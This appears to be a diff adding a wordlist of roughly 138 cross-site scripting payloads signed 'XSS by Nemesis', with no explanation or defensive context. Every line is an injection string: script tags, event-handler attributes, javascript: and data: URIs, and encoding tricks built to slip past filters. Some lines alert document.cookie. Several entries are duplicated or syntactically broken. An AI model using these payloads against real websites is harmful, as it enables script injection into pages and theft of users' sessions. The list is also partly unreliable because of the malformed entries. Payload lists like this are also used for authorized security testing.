@@ -1,0 +1,138 @@
+<script>alert("XSS by Nemesis")</script>
+"<img src=x onerror=alert("XSS by Nemesis")>
+';alert("XSS by Nemesis")//
+<svg/onload=alert("XSS by Nemesis")>
+<body onload=alert("XSS by Nemesis")>
+"<svg><script>alert("XSS by Nemesis")</script>
+<iframe src='javascript:alert("XSS by Nemesis")'></iframe>
+'"><script>alert(String.fromCharCode(88,83,83))</script>
+jaVasCript:/*--><script>alert("XSS by Nemesis")</script>
+<math><maction xlink:href='javascript:alert("XSS by Nemesis")'></maction></math>
+<img src=x onerror=confirm`1`>
+<scr" + "ipt>alert("XSS by Nemesis")</scr" + "ipt>
+<img src=x onerror=al\u0065rt(1)>
+<svg/onload=String.fromCharCode(97,108,101,114,116)(1)>
+<body onload=window >
+"<svg><scr" + "ipt>alert("XSS by Nemesis")</scr" + "ipt>
+<iframe src='java\u0073cript:alert("XSS by Nemesis")'></iframe>
+'"><script>alert(String.fromCharCode(0x58,0x53,0x53))</script>
+jaVasCript:/*--><scr" + "ipt>alert("XSS by Nemesis")</scr" + "ipt>
+<math><maction xlink:href='java' + 'script:alert("XSS by Nemesis")'></maction></math>
+<img src=x onerror=window["con"+"firm"](`1`)>
+<svg><desc><![CDATA[</desc><script>alert("XSS by Nemesis")</script>]]></svg>
+<details open ontoggle=alert("XSS by Nemesis")>Click me</details>
+<input autofocus onfocus=alert("XSS by Nemesis")>
+<video><source onerror=alert("XSS by Nemesis")></video>
+<object data='javascript:alert("XSS by Nemesis")'></object>
+<embed src='javascript:alert("XSS by Nemesis")'>
+<meta http-equiv='refresh' content='0;url=javascript:alert("XSS by Nemesis")'>
+<link rel='stylesheet' href='javascript:alert("XSS by Nemesis")'>
+<form onsubmit=alert("XSS by Nemesis")><input type=submit></form>
+<button onclick=alert("XSS by Nemesis")>Click me</button>
+<a href='javascript:alert("XSS by Nemesis")'>Click</a>
+<img src=x onerror=this.onerror=null;alert("XSS by Nemesis")>
+<iframe onload=alert("XSS by Nemesis")>
+<math><mi xlink:href='javascript:alert("XSS by Nemesis")'>X</mi></math>
+<svg><foreignObject><body onload=alert("XSS by Nemesis")></foreignObject></svg>
+<script src=data:text/javascript,alert("XSS by Nemesis")></script>
+<img src='x' onerror='setTimeout(() => alert("XSS by Nemesis"), 0)'>
+<svg><animate onbegin=alert("XSS by Nemesis") attributeName='x' from='0' to='1' /></svg>
+<style>@import 'javascript:alert("XSS by Nemesis")';</style>
+<video onpause=alert("XSS by Nemesis") autoplay><source src='invalid.mp4'></video>
+<base href='javascript:alert("XSS by Nemesis")//'>
+<img src=x onerror=alert("XSS by Nemesis")//>
+<img src=x onerror=eval('alert("XSS by Nemesis")')>
+<script>confirm(1)</script>
+<img src=x onerror=prompt(1)>
+<svg onload=confirm(1)>
+<iframe srcdoc="<script>alert("XSS by Nemesis")</script>"></iframe>
+<a href="javascript:alert("XSS by Nemesis")">Click</a>
+<svg><script xlink:href="data:text/javascript,alert("XSS by Nemesis")"></script></svg>
+<math><annotation-xml encoding="application/xhtml+xml"><script>alert("XSS by Nemesis")</script></annotation-xml></math>
+<object type="text/html" data="javascript:alert("XSS by Nemesis")"></object>
+<svg><set attributeName="onbegin" to="alert("XSS by Nemesis")" begin="click"/></svg>
+<input value="test" onfocus=alert("XSS by Nemesis") autofocus>
+<textarea onfocus=alert("XSS by Nemesis")>test</textarea>
+<div onmouseover=alert("XSS by Nemesis")>Hover me</div>
+<details ontoggle=alert("XSS by Nemesis")>Toggle me</details>
+<video onerror=alert("XSS by Nemesis") src="invalid.mp4"></video>
+<style>body{background:url("javascript:alert("XSS by Nemesis")");}</style>
+<marquee onstart=alert("XSS by Nemesis")>Moving Text</marquee>
+<object type="image/svg+xml" data="data:image/svg+xml;base64,PHN2ZyBvbm9uZXJyb3I9YWxlcnQoMSk+PC9zdmc+"></object>
+<svg><image href="javascript:alert("XSS by Nemesis")" /></svg>
+<embed src="data:text/html,<script>alert("XSS by Nemesis")</script>"></embed>
+<form><input type="text" onkeyup="alert("XSS by Nemesis")"></form>
+<button onmouseup=alert("XSS by Nemesis")>Click</button>
+<frame src="javascript:alert("XSS by Nemesis")"></frame>
+<isindex action="javascript:alert("XSS by Nemesis")">
+<keygen onfocus=alert("XSS by Nemesis")>
+<menuitem onclick=alert("XSS by Nemesis")>Menu</menuitem>
+<meta http-equiv="refresh" content="0;url=javascript:alert("XSS by Nemesis")">
+<base href="javascript:alert("XSS by Nemesis")//">
+<script>setTimeout(() => alert("XSS by Nemesis"), 0)</script>
+<audio src="invalid.mp3" onerror=alert("XSS by Nemesis")></audio>
+<track onerror=alert("XSS by Nemesis") src="invalid.vtt" kind="subtitles" label="en">
+<object onerror=alert("XSS by Nemesis") data="invalid"></object>
+<body onafterprint=alert("XSS by Nemesis")>
+<iframe sandbox="allow-scripts" srcdoc="<script>alert("XSS by Nemesis")</script>"></iframe>
+<svg><animateMotion onbegin=alert("XSS by Nemesis") dur="1s" path="M0,0 L100,0" /></svg>
+<textarea oninput=alert("XSS by Nemesis")></textarea>
+<input list="b" oninput=alert("XSS by Nemesis")><datalist id="b"><option value="1"></datalist>
+<img src=x onerror=alert(document.domain)>
+<svg><script>alert(document.cookie)</script></svg>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Base64 link</a>
+<script>new Image().src='javascript:alert("XSS by Nemesis")';</script>
+<input onblur=alert("XSS by Nemesis")>
+<textarea onblur=alert("XSS by Nemesis")></textarea>
+<div tabindex="0" onfocus=alert("XSS by Nemesis")>Focus me</div>
+<label for="input" onmouseover=alert("XSS by Nemesis")>Hover label</label><input id="input">
+<img src="x" onerror=alert('XSS via onerror')>
+<a href="javascript:void(alert("XSS by Nemesis"))">Void alert</a>
+<script>document.body.appendChild(document.createElement('script')).src='data:text/javascript,alert("XSS by Nemesis")';</script>
+<object type="application/x-shockwave-flash" data="data:application/x-shockwave-flash;base64,..." ></object>
+<svg><circle onmousemove=alert("XSS by Nemesis") cx="50" cy="50" r="40"/></svg>
+<input type="image" src="x" onerror=alert("XSS by Nemesis")>
+<img srcset="x, x onerror=alert("XSS by Nemesis") 2x">
+<audio oncanplay=alert("XSS by Nemesis") src="invalid.mp3"></audio>
+<video onseeked=alert("XSS by Nemesis") src="invalid.mp4"></video>
+<img src=x onerror=alert("XSS by Nemesis") style="width: expression(alert("XSS by Nemesis"))">
+<script>window.onerror = function() { alert("XSS by Nemesis"); }</script>
+<object data="javascript:alert("XSS by Nemesis")" type="text/html"></object>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+<div style="background-image: url(javascript:alert("XSS by Nemesis"))">XSS</div>
+<form onreset=alert("XSS by Nemesis")><input type=reset></form>
+<input type=image src=x onerror=alert("XSS by Nemesis")>
+<object onload=alert("XSS by Nemesis") data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<svg><use xlink:href="javascript:alert("XSS by Nemesis")#x"></use></svg>
+<object data="data:text/html,<script>alert("XSS by Nemesis")</script>"></object>
+<button oncontextmenu=alert("XSS by Nemesis")>Right Click</button>
+<svg onmouseover=alert("XSS by Nemesis")><rect width="100" height="100"/></svg>
+<input type="search" onsearch=alert("XSS by Nemesis")>
+<canvas onwebglcontextlost=alert("XSS by Nemesis")></canvas>
+<input onkeydown=alert("XSS by Nemesis")>
+<video onratechange=alert("XSS by Nemesis") src="invalid.mp4"></video>
+<svg><desc><script>alert("XSS by Nemesis")</script></desc></svg>
+<object type="image/svg+xml" data="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+"></object>
+<div style="background-image:url('javascript:alert("XSS by Nemesis")')">XSS</div>
+<textarea onkeydown=alert("XSS by Nemesis")></textarea>
+<input type=color oninput=alert("XSS by Nemesis")>
+<button onpointerdown=alert("XSS by Nemesis")>Pointer Down</button>
+<svg><feGaussianBlur in="SourceGraphic" stdDeviation="0" onbegin=alert("XSS by Nemesis") /></svg>
+<form oninput=alert("XSS by Nemesis")><input></form>
+<script>alert(String.fromCharCode(88,83,83,32,98,121,32,78,101,109,101,115,105,115))</script>
+<img src=x onerror=alert(String.fromCharCode(88,83,83,32,98,121,32,78,101,109,101,115,105,115))>
+';alert(String.fromCharCode(88,83,83,32,98,121,32,78,101,109,101,115,105,115))//
+<svg/onload=alert(String.fromCharCode(88,83,83,32,98,121,32,78,101,109,101,115,105,115))>
+<body onload=alert(String.fromCharCode(88,83,83,32,98,121,32,78,101,109,101,115,105,115))>
+"<svg><script>alert(String.fromCharCode(88,83,83,32,98,121,32,78,101,109,101,115,105,115))</script>
+<iframe src='javascript:alert(String.fromCharCode(88,83,83,32,98,121,32,78,101,109,101,115,105,115))'></iframe>
+'"><script>alert(String.fromCharCode(88,83,83,32,98,121,32,78,101,109,101,115,105,115))</script>
+jaVasCript:/*--><script>alert(String.fromCharCode(88,83,83,32,98,121,32,78,101,109,101,115,105,115))</script>
+<math><maction xlink:href='javascript:alert(String.fromCharCode(88,83,83,32,98,121,32,78,101,109,101,115,105,115))'></maction></math>
+<img src=x onerror=confirm`1`>
+<scr" + "ipt>alert(String.fromCharCode(88,83,83,32,98,121,32,78,101,109,101,115,105,115))</scr" + "ipt>
+<img src=x onerror=al\u0065rt(1)>
+<svg/onload=String.fromCharCode(97,108,101,114,116)(1)>
+<body onload=window >
+"<svg><scr" + "ipt>alert(String.fromCharCode(88,83,83,32,98,121,32,78,101,109,101,115,105,115))</scr" + "ipt>
+<iframe src='java\u0073cript:alert(String.fromCharCode(88,83,83,32,98,121,32,78,101,109,101,115,105,115))'></iframe>
